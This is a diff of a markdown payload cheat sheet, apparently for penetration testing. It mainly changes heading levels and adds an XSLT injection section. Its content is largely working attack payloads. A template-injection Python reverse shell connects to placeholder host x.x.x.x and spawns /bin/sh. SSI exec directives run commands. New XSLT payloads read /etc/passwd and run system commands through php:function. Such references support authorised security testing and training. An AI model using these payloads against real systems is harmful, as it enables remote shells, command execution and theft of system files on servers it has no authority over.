@@ -39,9 +39,9 @@ ${4+4}
 <%import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",1236));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);%>
 ```
 
-# SSI Injection
+## SSI Injection
 
-## Common file extensions
+### Common file extensions
 
 ```
 .shtml
@@ -49,15 +49,21 @@ ${4+4}
 .stm    
 ```
 
-## Useful directives
+### Useful directives
 
 ```html
 <!--#exec cmd="whoami" -->
 <!--#include virtual="some-source.js" -->
 ```
 
-# XSLT Injection
+## XSLT Injection
 
+### Detection
+The `<` char since we are injecting XSL elements directly in XML.
+
+### Useful elements
 ```xml
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
+<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
 <xsl:value-of select="php:function('system','id')" />
 ```
